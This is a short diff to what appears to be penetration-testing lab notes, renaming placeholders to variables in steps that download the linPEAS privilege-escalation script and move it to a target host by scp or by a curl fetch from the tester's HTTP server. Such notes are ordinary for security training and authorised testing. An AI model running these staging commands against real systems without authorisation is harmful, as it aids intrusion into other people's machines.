@@ -20,10 +20,10 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 chmod +x /opt/linpeas.sh
 
 # Transfer to target
-scp /opt/linpeas.sh user@<TARGET>:/tmp/linpeas.sh
+scp /opt/linpeas.sh user@$BoxIP:/tmp/linpeas.sh
 # or via Python HTTP server:
 cd /opt && python3 -m http.server 80
-# on target: curl http://<KALI_IP>/linpeas.sh -o /tmp/linpeas.sh
+# on target: curl http://$LocalIP/linpeas.sh -o /tmp/linpeas.sh
 ```
 
 ---
